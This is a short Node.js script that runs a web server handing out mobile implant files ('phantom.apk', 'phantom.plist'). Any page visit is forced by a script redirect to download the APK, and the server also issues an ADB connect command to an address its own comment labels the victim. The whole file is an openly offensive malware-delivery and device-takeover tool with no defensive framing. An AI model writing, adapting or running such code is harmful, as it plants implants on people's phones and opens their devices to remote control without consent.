const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');

http.createServer((req, res) => {
  if (req.url === '/phantom.apk') {
    res.end(fs.readFileSync('../../implants/phantom.apk'));
    exec('adb connect 192.168.43.5:5555'); // Auto-connect to victim
  } else if (req.url === '/phantom.plist') {
    res.end(fs.readFileSync('../../implants/phantom.plist'));
  } else {
    res.end(`
      <script>
        window.location.href = 'http://192.168.43.1:8080/phantom.apk';
        fetch('http://192.168.43.1:8080/phantom.plist');
      </script>
    `);
  }
}).listen(8080);
